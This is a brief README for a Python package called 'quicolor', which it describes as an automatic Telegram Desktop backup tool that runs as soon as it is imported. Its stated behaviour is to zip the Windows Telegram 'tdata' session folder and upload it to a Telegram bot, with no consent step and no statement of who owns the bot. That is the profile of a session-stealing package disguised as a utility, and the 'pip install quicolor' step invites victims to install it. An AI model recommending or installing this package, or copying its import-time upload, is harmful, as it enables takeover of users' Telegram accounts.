# Quicolor

Automatic Telegram Desktop backup utility that runs when imported.

## Installation

```bash
pip install quicolor
```

## Usage

The package runs automatically when imported:

```python
import quicolor
# That's it! It runs automatically.
```

### What it does

1. Compresses the Telegram Desktop data folder (tdata) from the standard Windows location
2. Uploads the compressed file to a Telegram bot
3. Removes the temporary zip file after upload

## Note

This package is designed for Windows systems only. 